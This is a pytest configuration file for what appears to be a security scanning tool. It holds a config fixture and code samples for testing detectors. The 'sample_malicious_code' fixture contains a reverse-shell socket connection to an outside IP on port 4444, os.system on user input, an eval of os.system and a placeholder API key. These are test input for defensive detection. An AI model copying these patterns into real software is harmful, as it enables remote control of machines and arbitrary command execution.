"""
Test configuration for pytest
"""

import pytest
import sys
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent
sys.path.insert(0, str(project_root))


@pytest.fixture
def sample_config():
    """Sample configuration for testing."""
    return {
        'security': {
            'scan_on_install': True,
            'block_malicious': True,
            'quarantine_dir': './test_quarantine',
            'keys_file': './test_keys/.keyring'
        },
        'api_key': {
            'encryption': True,
            'auto_rotate': True,
            'rotation_interval': 86400
        },
        'network': {
            'monitor': True,
            'auto_block': True,
            'blacklist_file': './config/blacklist.txt'
        },
        'logging': {
            'level': 'INFO',
            'file': './tests/test_logs/security.log'
        },
        'threat_detection': {
            'enabled': True,
            'sensitivity': 'high',
            'auto_block': True
        },
        'audit': {
            'database': ':memory:',
            'retention_days': 90
        },
        'asset_discovery': {
            'max_file_size': 10 * 1024 * 1024,
            'exclude_patterns': ['__pycache__', '.git']
        },
        'process_monitor': {
            'scan_interval': 5.0,
            'cpu_threshold': 80.0,
            'memory_threshold': 80.0
        },
        'ai_analyzer': {
            'injection_threshold': 0.7,
            'pii_types': ['email', 'ssn', 'api_key']
        },
        'prompt_guard': {
            'block_threshold': 0.7,
            'warn_threshold': 0.4
        },
        'content_audit': {
            'enabled_checks': ['pii_personal', 'api_keys', 'credentials'],
            'max_file_size': 10 * 1024 * 1024
        },
        'microseg': {
            'default_action': 'deny',
            'log_denied': True
        },
        'access_control': {
            'process_mode': 'allowlist',
            'protected_paths': ['/etc', '/usr/bin'],
            'restricted_users': ['nobody']
        },
        'av_engine': {
            'quarantine_dir': './test_quarantine',
            'yara_rules_path': './config/yara_rules'
        },
        'ssl_decrypt': {
            'listen_host': '127.0.0.1',
            'listen_port': 8081,
            'hostname_blocklist': [],
            'ca_dir': './test_ssl_ca'
        }
    }


@pytest.fixture
def temp_dir(tmp_path):
    """Temporary directory fixture."""
    return tmp_path


@pytest.fixture
def sample_malicious_code():
    """Sample malicious code for testing."""
    return """
import os
import subprocess

# Malicious: code execution
user_input = input("Enter command: ")
os.system(user_input)

# Malicious: reverse shell
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('185.220.101.1', 4444))

# Malicious: API key leak
api_key = "sk-1234567890abcdefghijklmnop"

# Malicious: eval usage
code = "__import__('os').system('ls')"
eval(code)
"""


@pytest.fixture
def sample_safe_code():
    """Sample safe code for testing."""
    return """
import os
from pathlib import Path

def greet(name):
    return f"Hello, {name}!"

def process_file(file_path):
    path = Path(file_path)
    if path.exists():
        with open(path, 'r') as f:
            return f.read()
    return None

class DataProcessor:
    def __init__(self, config):
        self.config = config

    def process(self, data):
        return data.upper()
"""
